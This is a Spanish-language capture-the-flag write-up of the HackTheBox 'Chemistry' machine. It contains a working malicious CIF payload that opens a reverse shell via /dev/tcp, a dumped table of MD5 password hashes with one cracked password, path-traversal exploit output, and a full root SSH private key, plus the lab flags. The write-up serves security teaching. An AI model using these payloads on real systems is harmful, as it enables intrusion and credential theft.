# Write Up Chemistry HackTheBox

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-15 02:24 EST
Nmap scan report for 10.10.11.38
Host is up (0.035s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Sun, 15 Dec 2024 07:24:49 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
8000/tcp open  http    SimpleHTTPServer 0.6 (Python 3.8.10)
|_http-title: Directory listing for /
|_http-server-header: SimpleHTTP/0.6 Python/3.8.10
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=12/15%Time=675E8437%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,38A,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3
SF:\x20Python/3\.9\.5\r\nDate:\x20Sun,\x2015\x20Dec\x202024\x2007:24:49\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20
SF:html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=
SF:\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"wid
SF:th=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Chemi
SF:stry\x20-\x20Home</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\
SF:x20href=\"/static/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x20\n\x
SF:20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<div\x20class
SF:=\"container\">\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\"title\"
SF:>Chemistry\x20CIF\x20Analyzer</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>
SF:Welcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x20tool\
SF:x20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographic\x20I
SF:nformation\x20File\)\x20and\x20analyze\x20the\x20structural\x20data\x20
SF:contained\x20within\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20clas
SF:s=\"buttons\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<center
SF:><a\x20href=\"/login\"\x20class=\"btn\">Login</a>\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20<a\x20href=\"/register\"\x20class=\"btn\">R
SF:egister</a></center>\n\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\
SF:x20\x20</div>\n</body>\n<")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUB
SF:LIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x
SF:20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Con
SF:tent-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>
SF:\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20
SF:response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400
SF:</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20
SF:version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Er
SF:ror\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20r
SF:equest\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20
SF:</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.00 seconds
```

Vemos 2 puertos interesantes, uno que es en el `8000` un archivo llamado `database.db` el cual no nos interesa mucho ya que no hay nada dentro y otro en el puerto `5000` en la que esta alojada una pagina web.

Si le damos en dicha pagina a `registrarnos` ya que no tenemos ningun usuario, entraremos en un `dashboard` donde podremos subir un archivo, pero si nos fijamos solo nos permite subir archivos `.cif` por lo que vamos a investigar si hay alguna vulnerabilidad de dicho archivo.

## Intrusión (user app)

URL = [GitHub Vuln CIF File](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)

Vemos que en el siguiente repositorio nos muestra que hay una vuilnerabilidad de ello y como aprovecharla, por lo que haremos lo siguiente.

Crearemos un archivo entorno al repositorio, pero con una reverse shell:

> exploit.cif

```cif
data_5yOhtAoR  
_audit_creation_date            2018-06-08  
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"  
  
loop_  
_parent_propagation_vector.id  
_parent_propagation_vector.kxkykz  
k1 [0 0 0]  
  
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \ 'sh -i >& /dev/tcp/<IP>/<PORT> 0>&1\'");0,0,0'  
  

_space_group_magn.number_BNS  62.448  
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Lo guardamos y lo subiremos a la pagina con el boton de `Upload`, una vez echo eso, veremos que el archivo se ha subido correctamente, por lo que nos pondremos a la escucha antes:

```shell
nc -lvnp <PORT>
```

Y ahora le daremos al boton de `View` para que se nos cree la `reverse shell`, una vez que le hayamos dado veremos lo siguiente si volvemos a donde teniamos la escucha:

```
listening on [any] 7777 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.38] 35828
sh: 0: can't access tty; job control turned off
$ whoami
app
```

## Escalate user rosa

Primero sanitizaremos la shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Si vemos los puertos que estan corriendo en general en la maquina victima:

```shell
ss -tuln
```

Info:

```
Netid              State               Recv-Q              Send-Q                           Local Address:Port                           Peer Address:Port              Process              
udp                UNCONN              0                   0                                127.0.0.53%lo:53                                  0.0.0.0:*                                      
udp                UNCONN              0                   0                                      0.0.0.0:68                                  0.0.0.0:*                                      
tcp                LISTEN              0                   128                                    0.0.0.0:5000                                0.0.0.0:*                                      
tcp                LISTEN              0                   128                                  127.0.0.1:8080                                0.0.0.0:*                                      
tcp                LISTEN              0                   4096                             127.0.0.53%lo:53                                  0.0.0.0:*                                      
tcp                LISTEN              0                   128                                    0.0.0.0:22                                  0.0.0.0:*                                      
tcp                LISTEN              0                   5                                      0.0.0.0:8000                                0.0.0.0:*                                      
tcp                LISTEN              0                   128                                       [::]:22                                     [::]:* 
```

Veremos que hay uno que esta corriendo por el puerto `8080` en la maquina de forma local, por lo que confirmaremos si es una pagina con un `curl`, pero en este caso no nos deja, por lo que seguiremos buscando y esto lo dejaremos para mas adelante.

Si seguimos buscando encontraremos la siguiente ruta bastante interesante:

```shell
cd /home/app/instance
```

Veremos que hay un archivo llamado `database.db` la cual si leemos, veremos lo siguiente:

```
�f�K�ytableuseruserCREATE TABLE user (
        id INTEGER NOT NULL,
        username VARCHAR(150) NOT NULL,
        password VARCHAR(150) NOT NULL,
        PRIMARY KEY (id),
        UNIQUE (username)
)';indexsqlite_autoindex_user_1user�3�5tablestructurestructureCREATE TABLE structure (
        id INTEGER NOT NULL,
        user_id INTEGER NOT NULL,
        filename VARCHAR(150) NOT NULL,
        identifier VARCHAR(100) NOT NULL,
        PRIMARY KEY (id),
        FOREIGN KEY(user_id) REFERENCES user (id),
        UNIQUE (identifier)
���f8dexsqlite_autoindex_structure_1structure
Maxel9347f9724ca083b17e39555c36fd9007*                                           kristel6896ba7b11a62cacffbdaded457c6d92(
eusebio6cad48078d0241cca9a7b322ecd073b3)abian4e5Mtaniaa4aa55e816205dc0389591c9f82f43bbMvictoriac3601ad2286a4293868ec2a4bc606ba3)Mpeter6845c17d298d95aa942127bdad2ceb9b*Mcarlos9ad48828b0955513f7cf0f7f6510c8f8*Mjobert3dec299e06f7ed187bac06bd3b670ab2*Mrobert02fcf7cfc10adc37959fb21f06c6b467(Mrosa63ed86ee9f624c7b14f1d4f43dc251a5'Mapp197865e46b878d9e74a0346b6d59886a)Madmin2861debaf8d99436a10ed6f75a252abf
Y��x�Y����l����c�_�     disetest
                                risteaxel
fabian

      elacia

            usebio
        tania
                victoriapeter
carlos
jobert
roberrosaapp    admin
```

Entre tanto caos, vemos una linea interesante:

```
Mrosa63ed86ee9f624c7b14f1d4f43dc251a5
```

> HASH

```
63ed86ee9f624c7b14f1d4f43dc251a5
```

Parece que va dirigido al usuario `rosa` que tenemos en el sistema y es un hash `MD5` aparentemente, por lo que lo intentaremos crackear, con la siguiente pagina:

URL = [Decrypt Hash MD5](https://www.dcode.fr/md5-hash)

Si lo decodificamos, veremos lo siguiente:

```
unicorniosrosados
```

Por lo que nos conectaremos por `SSH` mejor con esta contraseña del usuario `rosa`.

```shell
ssh rosa@<IP>
```

Metemos la contraseña `unicorniosrosados` y ya estariamos dentro, por lo que leeremos la flag del usuario:

> user.txt

```
6acb719323a54d4d50bd017bbbeed7c9
```

## Escalate Privileges

Ahora si hacemos el `curl` de antes que no pudimos hacer para ver si hay una pagina web en el puerto `8080` de la maquina victima del `localhost`:

```shell
curl http://localhost:8080
```

Info:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Monitoring</title>
    <link rel="stylesheet" href="/assets/css/all.min.css">
    <script src="/assets/js/jquery-3.6.0.min.js"></script>
    <script src="/assets/js/chart.js"></script>
    <link rel="stylesheet" href="/assets/css/style.css">
    <style>
    h2 {
      color: black;
      font-style: italic;
    }


    </style>
</head>
<body>
    <nav class="navbar">
        <div class="container">
            <h1 class="logo"><i class="fas fa-chart-line"></i> Site Monitoring</h1>
            <ul class="nav-links">
                <li><a href="#" id="home"><i class="fas fa-home"></i> Home</a></li>
                <li><a href="#" id="start-service"><i class="fas fa-play"></i> Start Service</a></li>
                <li><a href="#" id="stop-service"><i class="fas fa-stop"></i> Stop Service</a></li>
                <li><a href="#" id="list-services"><i class="fas fa-list"></i> List Services</a></li>
                <li><a href="#" id="check-attacks"><i class="fas fa-exclamation-triangle"></i> Check Attacks</a></li>
            </ul>
        </div>
    </nav>

    <div class="container">
        <div id="earnings">
            <h2>2023 Earnings</h2>
            <canvas id="earningsChart"></canvas>
        </div>
        <div id="views">
            <h2>Views per Month</h2>
            <canvas id="viewsChart"></canvas>
        </div>
        <div id="ad-clicks">
            <h2>Ad Clicks per Visit</h2>
            <canvas id="adClicksChart"></canvas>
        </div>
        <div id="service-list" style="display:none;">
            <h2>Service List</h2>
            <ul id="service-list-content">
                <!-- Will be filled dynamically with JavaScript -->
            </ul>
        </div>
        <div id="attack-logs" style="display:none;">
            <h2>Possible Attacks</h2>
            <h3><p style="color:red;">Functionality currently under development</p></h3>
            <ul id="attack-logs-content">
            </ul>
        </div>
        <div class="loader" id="loader" style="display:none;">Loading...</div>
    </div>

    <script src="/assets/js/script.js"></script>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const earnings = {"April": 3000, "August": 5000, "February": 2000, "January": 1500, "July": 4500, "June": 4000, "March": 2500, "May": 3500, "September": 5500};
            const views = {"April": 40000, "August": 60000, "February": 30000, "January": 25000, "July": 55000, "June": 50000, "March": 35000, "May": 45000, "September": 65000};
            const adClicks = {"Ad1": 650, "Ad2": 200, "Ad3": 1000};

            // Earnings Chart Configuration
            const earningsCtx = document.getElementById('earningsChart').getContext('2d');
            const earningsChart = new Chart(earningsCtx, {
                type: 'bar',
                data: {
                    labels: Object.keys(earnings),
                    datasets: [{
                        label: 'Earnings ($)',
                        data: Object.values(earnings),
                        backgroundColor: 'rgba(75, 192, 192, 0.2)',
                        borderColor: 'rgba(75, 192, 192, 1)',
                        borderWidth: 1
                    }]
                },
                options: {
                    responsive: true,
                    scales: {
                        y: {
                            beginAtZero: true
                        }
                    }
                }
            });

            // Views Chart Configuration
            const viewsCtx = document.getElementById('viewsChart').getContext('2d');
            const viewsChart = new Chart(viewsCtx, {
                type: 'line',
                data: {
                    labels: Object.keys(views),
                    datasets: [{
                        label: 'Views',
                        data: Object.values(views),
                        backgroundColor: 'rgba(153, 102, 255, 0.2)',
                        borderColor: 'rgba(153, 102, 255, 1)',
                        borderWidth: 1
                    }]
                },
                options: {
                    responsive: true,
                    scales: {
                        y: {
                            beginAtZero: true
                        }
                    }
                }
            });

            // Ad Clicks Chart Configuration
            const adClicksCtx = document.getElementById('adClicksChart').getContext('2d');
            const adClicksChart = new Chart(adClicksCtx, {
                type: 'pie',
                data: {
                    labels: Object.keys(adClicks),
                    datasets: [{
                        label: 'Clicks',
                        data: Object.values(adClicks),
                        backgroundColor: [
                            'rgba(255, 99, 132, 0.2)',
                            'rgba(54, 162, 235, 0.2)',
                            'rgba(255, 206, 86, 0.2)',
                            'rgba(75, 192, 192, 0.2)',
                            'rgba(153, 102, 255, 0.2)',
                            'rgba(255, 159, 64, 0.2)'
                        ],
                        borderColor: [
                            'rgba(255, 99, 132, 1)',
                            'rgba(54, 162, 235, 1)',
                            'rgba(255, 206, 86, 1)',
                            'rgba(75, 192, 192, 1)',
                            'rgba(153, 102, 255, 1)',
                            'rgba(255, 159, 64, 1)'
                        ],
                        borderWidth: 1
                    }]
                },
                options: {
                    responsive: true
                }
            });
        });
    </script>
</body>
</html>
```

Veremos que si contiene una pagina web, por lo que nos vamos hacer un reenvio de puertos (`forwarding`) mediante `ssh`:

```shell
ssh -L 8080:127.0.0.1:8080 rosa@<IP>
```

Esto nos metera en la maquina de nuevo, pero si ahora vamos a nuestra maquina atacante y en el navegador ponemos la siguiente `URL`:

```
URL = http://localhost:8080
```

Podremos ver la pagina que estabamos haciendo con un `curl` viendose algo tal que asi:

<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

Si vemos las versiones de la pagina web con el siguiente comando:

```shell
whatweb http://localhost:8080/
```

Info:

```
http://localhost:8080/ [200 OK] HTML5, HTTPServer[Python/3.9 aiohttp/3.9.1], IP[::1], JQuery[3.6.0], Script, Title[Site Monitoring]
```

Veremos que hay una version en especifico bastante interesante que es la siguiente:

```
aiohttp/3.9.1
```

Por lo que veremos si contiene alguna vulnerabilidad.

Si nos vamos a la siguiente `URL`:

URL = [GitHub Vuln aiohttp 3.9.1](https://github.com/wizarddos/CVE-2024-23334)

Vemos que si tiene una vulnerabilida para leer archivos del sistema que se centra en la ruta por defecto que es la `/static` pero en nuestro caso no estara en esa ruta, ya que si intentamos ejecutar el `.py` para sacar el `passwd` no va a funcionar, por lo que habra que descubrir la ruta:

### Gobuster

```shell
gobuster dir -u http://localhost:8080/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://localhost:8080/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 403) [Size: 14]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que solo nos saca una ruta, por lo que probaremos con esa, ejecutamos el exploit del repositorio de GitHub:

```shell
python3 exploit.py -u http://localhost:8080 -f /etc/passwd -d /assets
```

Info:

```
[+] Attempt 0
                    Payload: /assets/../etc/passwd
        
                    Status code: 404
[+] Attempt 1
                    Payload: /assets/../../etc/passwd
        
                    Status code: 404
[+] Attempt 2
                    Payload: /assets/../../../etc/passwd
        
                    Status code: 200
Respose: 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
app:x:1001:1001:,,,:/home/app:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false

Exploit complete
```

Y por lo que vemos funciona, por lo que probaremos a hacer lo siguiente:

```shell
python3 exploit.py -u http://localhost:8080 -f /root/.ssh/id_rsa -d /assets 
```

Info:

```
[+] Attempt 0
                    Payload: /assets/../root/.ssh/id_rsa
        
                    Status code: 404
[+] Attempt 1
                    Payload: /assets/../../root/.ssh/id_rsa
        
                    Status code: 404
[+] Attempt 2
                    Payload: /assets/../../../root/.ssh/id_rsa
        
                    Status code: 200
Respose: 
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

Exploit complete
```

Por lo que vemos funciona, por lo que nos conectaremos con su clave privada mediante `ssh` como `root`:

```shell
nano id_rsa

#Dentro del nano
<CONTENIDO_ID_RSA>
```

```shell
chmod 600 id_rsa
```

```shell
ssh -i id_rsa root@<IP>
```

Info:

```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun 15 Dec 2024 08:41:59 AM UTC

  System load:           0.08
  Usage of /:            77.0% of 5.08GB
  Memory usage:          33%
  Swap usage:            0%
  Processes:             238
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.38
  IPv6 address for eth0: dead:beef::250:56ff:fe94:edc8


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

9 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Dec 15 05:13:53 2024 from 10.10.14.9
root@chemistry:~#
```

Y con esto ya seremos `root`, por lo que leeremos la flag.

> root.txt

```
51c410b0b4376d44922c85a0d3305dab
```
